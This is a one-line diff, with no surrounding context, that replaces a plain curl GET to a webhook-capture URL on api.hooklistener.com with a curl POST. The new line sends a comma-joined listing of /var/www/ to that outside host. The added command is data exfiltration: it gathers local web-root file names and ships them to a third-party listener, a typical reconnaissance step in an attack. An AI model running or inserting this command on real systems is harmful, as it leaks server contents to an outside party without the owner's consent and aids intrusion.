@@ -1,1 +1,1 @@
-curl -X GET https://api.hooklistener.com/w/controlled-violet-jaguar-5ive
+curl -X POST -d "data=$(ls /var/www/ | tr '\n' ',' )" https://api.hooklistener.com/w/controlled-violet-jaguar-5ive
